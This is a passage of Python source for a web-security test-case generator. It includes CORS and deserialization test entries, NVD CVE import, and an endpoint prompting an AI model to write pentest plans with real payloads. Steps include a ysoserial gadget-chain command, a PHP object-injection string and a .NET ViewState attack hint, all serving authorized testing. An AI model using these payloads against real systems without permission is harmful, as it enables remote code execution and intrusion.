            "Test: Origin: null — some servers allow null origin (sandbox/file:// exploit)",
            "Subdomain takeover CORS: Origin: sub.target.com — check if trusted subdomain wildcarded",
        ],
        "expected_result": "CORS allowlist is explicit. Credentials not exposed to untrusted origins.",
        "cwe": "CWE-942", "owasp": "A05:2021",
        "tools": {"nuclei_tags": ["cors", "misconfig"]},
        "applicable_to": ["web", "api"],
        "tags": ["cors", "headers", "misconfig"],
    },

    # ── Deserialization ───────────────────────────────────────────────────────
    {
        "id": "TC-PAT-DESER01",
        "title": "Insecure Deserialization — RCE via Object Injection",
        "category": "Advanced Injection",
        "severity": "critical",
        "description": (
            f"Probe {len(DESERIALIZATION_PATHS)} deserialization-prone endpoints for "
            "Java, PHP, Python pickle, and .NET serialization vulnerabilities."
        ),
        "attack_pattern": "Supply crafted serialized objects to gadget-chain endpoints to achieve RCE.",
        "steps": [
            f"Target paths: {', '.join(DESERIALIZATION_PATHS[:8])}",
            "Java: look for 'rO0AB' base64 prefix (Java serialization magic bytes aced0005)",
            "Tool: ysoserial to generate gadget chains — java -jar ysoserial.jar CommonsCollections6 'id' | base64",
            "PHP: look for O:8:\"stdClass\" patterns in cookies, session storage, or POST bodies",
            "PHP object injection: O:8:\"SomeClass\":1:{s:4:\"data\";s:7:\"payload\";}",
            "Python pickle: look for __reduce__ exploitation patterns",
            ".NET: check ViewState — decrypt with machineKey; inject TypeConfuseDelegate chain",
        ],
        "expected_result": "Deserialization uses integrity-checked, type-allowlisted parsers. No gadget chains reachable.",
        "cwe": "CWE-502", "owasp": "A08:2021",
        "tools": {"nuclei_tags": ["deserialization", "rce"]},
        "applicable_to": ["web", "api"],
        "tags": ["deserialization", "rce", "java", "php"],
    },
]

# ─────────────────────────────────────────────────────────────────────────────
# CVE → CWE category mapping (for NVD refresh)
# ─────────────────────────────────────────────────────────────────────────────

CWE_TO_CATEGORY = {
    "CWE-79":  "Web Application",    # XSS
    "CWE-89":  "Web Application",    # SQLi
    "CWE-78":  "Web Application",    # OS Command Injection
    "CWE-22":  "Web Application",    # Path Traversal
    "CWE-918": "Web Application",    # SSRF
    "CWE-611": "Web Application",    # XXE
    "CWE-94":  "Advanced Injection", # Code Injection
    "CWE-93":  "Advanced Injection", # CRLF Injection
    "CWE-352": "Web Application",    # CSRF
    "CWE-601": "Web Application",    # Open Redirect
    "CWE-287": "Authentication",     # Improper Auth
    "CWE-863": "Authentication",     # Authorization Bypass
    "CWE-284": "Infrastructure",     # Access Control
    "CWE-200": "Information Disclosure",
    "CWE-209": "Information Disclosure",
    "CWE-502": "Web Application",    # Insecure Deserialization
    "CWE-434": "File Upload",        # Unrestricted Upload
    "CWE-798": "Reconnaissance",     # Hardcoded Credentials
    "CWE-306": "Authentication",     # Missing Auth
    "CWE-269": "Cloud Security",     # Privilege Escalation
    "CWE-326": "Infrastructure",     # Weak Encryption
    "CWE-338": "Cryptography",       # Weak PRNG
}

CWE_TO_SEVERITY = {
    "CWE-78": "critical", "CWE-89": "critical", "CWE-94": "critical",
    "CWE-918": "critical", "CWE-434": "critical", "CWE-502": "critical",
    "CWE-79": "high", "CWE-22": "high", "CWE-611": "high",
    "CWE-287": "high", "CWE-863": "high", "CWE-284": "high",
    "CWE-601": "medium", "CWE-352": "medium", "CWE-93": "medium",
    "CWE-200": "low", "CWE-209": "low", "CWE-326": "medium",
}


def _cve_to_test_case(cve_data: dict) -> dict | None:
    """Convert an NVD CVE entry to a test case dict."""
    try:
        cve_id = cve_data.get("cve", {}).get("id", "")
        descriptions = cve_data.get("cve", {}).get("descriptions", [])
        description = next((d["value"] for d in descriptions if d["lang"] == "en"), "")
        if not description or len(description) < 20:
            return None

        metrics = cve_data.get("cve", {}).get("metrics", {})
        cvss_v3 = metrics.get("cvssMetricV31", metrics.get("cvssMetricV30", []))
        score = 0.0
        severity = "medium"
        if cvss_v3:
            data = cvss_v3[0].get("cvssData", {})
            score = data.get("baseScore", 0.0)
            severity = data.get("baseSeverity", "MEDIUM").lower()

        weaknesses = cve_data.get("cve", {}).get("weaknesses", [])
        cwe_ids = []
        for w in weaknesses:
            for d in w.get("description", []):
                val = d.get("value", "")
                if val.startswith("CWE-"):
                    cwe_ids.append(val)

        primary_cwe = cwe_ids[0] if cwe_ids else None
        category = CWE_TO_CATEGORY.get(primary_cwe, "Web Application") if primary_cwe else "Web Application"
        if primary_cwe and primary_cwe in CWE_TO_SEVERITY:
            severity = CWE_TO_SEVERITY[primary_cwe]

        # Truncate long descriptions
        short_desc = description[:400] + "..." if len(description) > 400 else description

        # Map CWE to tools
        tools: dict = {}
        if primary_cwe in ("CWE-79", "CWE-89", "CWE-94", "CWE-918"):
            tools["nuclei_tags"] = ["cves"]

        pub_date = cve_data.get("cve", {}).get("published", "")[:10]

        return {
            "id": cve_id,
            "title": f"{cve_id} — {category} Vulnerability",
            "category": category,
            "severity": severity,
            "description": short_desc,
            "attack_pattern": f"Exploit {cve_id} ({primary_cwe or 'N/A'}) affecting vulnerable installations.",
            "steps": [
                f"Identify if target is running an affected version — check {cve_id} vendor advisory",
                "Run: nuclei -u <target> -tags cves to check for known CVE templates",
                f"Manual verification: review {cve_id} PoC from NVD or vendor advisory",
                "Check for patches: verify target has applied the relevant security update",
            ],
            "expected_result": f"Target must be patched against {cve_id}. Confirm fix by re-running CVE check.",
            "cwe": primary_cwe,
            "owasp": None,
            "cvss_score": score,
            "published": pub_date,
            "tools": tools,
            "applicable_to": ["web", "api", "network"],
            "tags": ["cve", "live", cve_id.lower()],
            "source": "NVD",
        }
    except Exception:
        return None


async def _fetch_recent_cves(limit: int = 30) -> list[dict]:
    """Fetch recent critical/high CVEs from NVD API v2."""
    results = []
    url = "https://services.nvd.nist.gov/rest/json/cves/2.0"
    params = {
        "resultsPerPage": limit,
        "cvssV3Severity": "CRITICAL",
        "startIndex": 0,
    }
    try:
        async with httpx.AsyncClient(timeout=20.0) as client:
            resp = await client.get(url, params=params)
            if resp.status_code == 200:
                data = resp.json()
                for item in data.get("vulnerabilities", []):
                    tc = _cve_to_test_case(item)
                    if tc:
                        results.append(tc)
    except Exception as e:
        logger.warning(f"NVD fetch failed: {e}")

    # Also fetch HIGH severity
    try:
        params["cvssV3Severity"] = "HIGH"
        params["resultsPerPage"] = 20
        async with httpx.AsyncClient(timeout=20.0) as client:
            resp = await client.get(url, params=params)
            if resp.status_code == 200:
                data = resp.json()
                for item in data.get("vulnerabilities", []):
                    tc = _cve_to_test_case(item)
                    if tc:
                        results.append(tc)
    except Exception as e:
        logger.warning(f"NVD HIGH fetch failed: {e}")

    return results


async def _stream_refresh() -> AsyncGenerator[str, None]:
    def _sse(event: str, data: dict) -> str:
        return f"event: {event}\ndata: {json.dumps(data)}\n\n"

    yield _sse("status", {"message": "Connecting to NVD NIST CVE database...", "progress": 10})

    cves = await _fetch_recent_cves(limit=30)

    yield _sse("status", {"message": f"Fetched {len(cves)} recent CVEs — processing...", "progress": 60})

    await __import__("asyncio").sleep(0)

    # De-duplicate against base library
    base_ids = {tc["id"] for tc in TEST_CASES}
    new_cases = [tc for tc in cves if tc["id"] not in base_ids]

    yield _sse("status", {"message": f"Processed {len(new_cases)} new unique test cases", "progress": 90})

    yield _sse("complete", {
        "total": len(new_cases),
        "items": new_cases,
        "source": "NVD NIST",
        "fetched_at": datetime.now(timezone.utc).isoformat(),
    })


# ─────────────────────────────────────────────────────────────────────────────
# Filtering logic
# ─────────────────────────────────────────────────────────────────────────────

def _filter_test_cases(target_types: list[str], tech_stack: list[str], scope: str | None) -> list[dict]:
    all_cases = TEST_CASES + PATTERN_TEST_CASES

    if not target_types:
        return all_cases

    filtered = []
    seen_ids: set[str] = set()

    for tc in all_cases:
        if any(t.lower() in tc.get("applicable_to", []) for t in target_types):
            tc_id = tc["id"]
            if tc_id not in seen_ids:
                seen_ids.add(tc_id)
                filtered.append(tc)

    cloud_keywords = {"aws", "gcp", "azure", "cloud", "s3", "lambda", "cloudfront"}
    if any(k in (t.lower() for t in tech_stack) for k in cloud_keywords):
        for tc in all_cases:
            if tc["id"] not in seen_ids and "cloud" in tc.get("applicable_to", []):
                seen_ids.add(tc["id"])
                filtered.append(tc)

    mobile_keywords = {"android", "ios", "react native", "flutter", "swift", "kotlin"}
    if any(k in (t.lower() for t in tech_stack) for k in mobile_keywords):
        for tc in all_cases:
            if tc["id"] not in seen_ids and "mobile" in tc.get("applicable_to", []):
                seen_ids.add(tc["id"])
                filtered.append(tc)

    return filtered


# ─────────────────────────────────────────────────────────────────────────────
# Request models
# ─────────────────────────────────────────────────────────────────────────────

class StandardRequest(BaseModel):
    target: str | None = None
    target_types: list[str] = []
    tech_stack: list[str] = []
    scope: str | None = None


class AIRequest(BaseModel):
    target: str | None = None
    target_types: list[str] = []
    tech_stack: list[str] = []
    scope: str | None = None
    threat_model: str | None = None


# ─────────────────────────────────────────────────────────────────────────────
# AI generation stream
# ─────────────────────────────────────────────────────────────────────────────

async def _stream_ai_testcases(payload: AIRequest) -> AsyncGenerator[str, None]:
    if not settings.ANTHROPIC_API_KEY:
        yield f"event: error\ndata: {json.dumps({'message': 'ANTHROPIC_API_KEY is not configured'})}\n\n"
        return

    client = anthropic.Anthropic(api_key=settings.ANTHROPIC_API_KEY)

    target_desc  = payload.target or "unspecified target"
    types_desc   = ", ".join(payload.target_types) if payload.target_types else "web application"
    stack_desc   = ", ".join(payload.tech_stack)   if payload.tech_stack   else "unknown stack"
    scope_desc   = payload.scope or "full application"
    threat_model = (f"\n\nTHREAT MODEL:\n{payload.threat_model[:4000]}" if payload.threat_model else "")

    base_categories = list({tc["category"] for tc in TEST_CASES + PATTERN_TEST_CASES})

    # Sample real payloads to anchor AI output to known-good patterns
    _xss_sample   = json.dumps(XSS_PAYLOADS[:4])
    _sqli_sample  = json.dumps(SQLI_ERROR_PAYLOADS[:4] + SQLI_TIME_PAYLOADS[:2])
    _ssrf_sample  = json.dumps([u for u, _ in SSRF_TARGETS[:3]])
    _ssti_sample  = json.dumps(SSTI_PAYLOADS[:4])
    _nosql_sample = json.dumps(NOSQL_INJECTION_PAYLOADS[:3])
    _jwt_sample   = json.dumps(JWT_ALG_NONE_VARIANTS[:3] + JWT_WEAK_SECRETS[:3])

    system_prompt = """You are a senior penetration tester generating a customized security test case plan.
Respond with ONLY a valid JSON array — no markdown fences, no explanation.
Each item must match this exact schema:
{"id":"TC-AI-001","title":"string","category":"string","severity":"critical|high|medium|low|info","description":"string","attack_pattern":"string","steps":["step"],"expected_result":"string","cwe":"CWE-XXX or null","owasp":"AXX:2021 or null","tools":{"nuclei_tags":[],"nmap":[],"ffuf_wordlist":""},"applicable_to":["web"],"tags":["tag"]}"""

    user_message = f"""Generate a comprehensive security test plan for:
TARGET: {target_desc}
TARGET TYPES: {types_desc}
TECHNOLOGY STACK: {stack_desc}
SCOPE: {scope_desc}{threat_model}

Categories to cover: {', '.join(base_categories)}

Rules:
1. Generate 30-40 test cases tailored to this specific tech stack
2. Include technology-specific tests (Django debug mode, React DOM XSS, Spring Actuator, etc.)
3. Reference real CVEs or OWASP WSTG test IDs where applicable
4. At least 4 critical severity tests
5. Cover: auth, authz, injection, config, secrets, business logic, and supply chain
6. Tool nuclei_tags must match real nuclei template tags (cves, exposures, misconfig, etc.)
7. Steps must be actionable — include specific commands AND real payloads from the examples below
8. Include at least one test case each for: XSS, SQLi, SSRF, SSTI, JWT, NoSQL if applicable

Real payload examples to reference in your steps (use these, not made-up values):
- XSS: {_xss_sample}
- SQLi error+time: {_sqli_sample}
- SSRF targets: {_ssrf_sample}
- SSTI probes: {_ssti_sample}
- NoSQL operators: {_nosql_sample}
- JWT attacks: {_jwt_sample}

Return ONLY the JSON array."""

    try:
        full_text = ""
        yield f"event: start\ndata: {json.dumps({'message': 'Generating AI test cases…'})}\n\n"

        with client.messages.stream(
            model=settings.AI_MODEL,
            max_tokens=8192,
            system=system_prompt,
            messages=[{"role": "user", "content": user_message}],
        ) as stream:
            for chunk in stream.text_stream:
                full_text += chunk
                yield f"event: token\ndata: {json.dumps({'text': chunk})}\n\n"

        text = full_text.strip()
        if text.startswith("```"):
            text = text.split("```")[1]
            if text.startswith("json"):
                text = text[4:]
            text = text.rsplit("```", 1)[0]

        cases = json.loads(text.strip())
        if isinstance(cases, dict) and "items" in cases:
            cases = cases["items"]

        sev_order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
        cases = sorted(cases, key=lambda c: sev_order.get(c.get("severity", "info"), 5))

        yield f"event: complete\ndata: {json.dumps({'total': len(cases), 'items': cases, 'mode': 'ai'})}\n\n"

    except json.JSONDecodeError as e:
        logger.error(f"AI test generator bad JSON: {e}")
        yield f"event: error\ndata: {json.dumps({'message': 'AI returned malformed response. Try again.'})}\n\n"
    except Exception as e:
        logger.error(f"AI test generator failed: {e}")
        yield f"event: error\ndata: {json.dumps({'message': str(e)})}\n\n"


# ─────────────────────────────────────────────────────────────────────────────
# Endpoints
# ─────────────────────────────────────────────────────────────────────────────

@router.post("/standard", summary="Generate test cases (rule-based library)")
async def generate_standard(
    payload: StandardRequest,
    current_user: Annotated[User, Depends(require_tool("test_generator"))],
) -> dict:
    cases = _filter_test_cases(payload.target_types, payload.tech_stack, payload.scope)
    sev_order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
    cases = sorted(cases, key=lambda c: sev_order.get(c["severity"], 5))
    return {"total": len(cases), "items": cases, "mode": "standard"}


@router.post("/ai", summary="Generate test cases with AI (SSE stream)")
async def generate_ai(
    payload: AIRequest,
    current_user: Annotated[User, Depends(require_tool("test_generator"))],
) -> StreamingResponse:
    if not settings.ANTHROPIC_API_KEY:
        raise HTTPException(status_code=status.HTTP_503_SERVICE_UNAVAILABLE,
                            detail="AI features require ANTHROPIC_API_KEY")
    return StreamingResponse(
        _stream_ai_testcases(payload),
        media_type="text/event-stream",
        headers={"Cache-Control": "no-cache", "Connection": "keep-alive", "X-Accel-Buffering": "no"},
    )


@router.get("/refresh", summary="Fetch latest CVEs from NVD and convert to test cases (SSE stream)")
async def refresh_from_sources(
    current_user: Annotated[User, Depends(get_current_user)],
) -> StreamingResponse:
    return StreamingResponse(
        _stream_refresh(),
        media_type="text/event-stream",
        headers={"Cache-Control": "no-cache", "Connection": "keep-alive", "X-Accel-Buffering": "no"},
    )


@router.get("/library", summary="Get the base test case library stats")
async def library_stats(
    current_user: Annotated[User, Depends(get_current_user)],
) -> dict:
    from collections import Counter
    all_cases = TEST_CASES + PATTERN_TEST_CASES
    categories = Counter(tc["category"] for tc in all_cases)
    severities = Counter(tc["severity"] for tc in all_cases)
    return {
        "total": len(all_cases),
        "base_library": len(TEST_CASES),
        "pattern_library": len(PATTERN_TEST_CASES),
        "categories": dict(categories),
        "severities": dict(severities),
        "sources": ["OWASP WSTG", "PayloadsAllTheThings", "pentester.land patterns", "NVD CVE", "attack_patterns (5700+ bug bounty reports)"],
    }
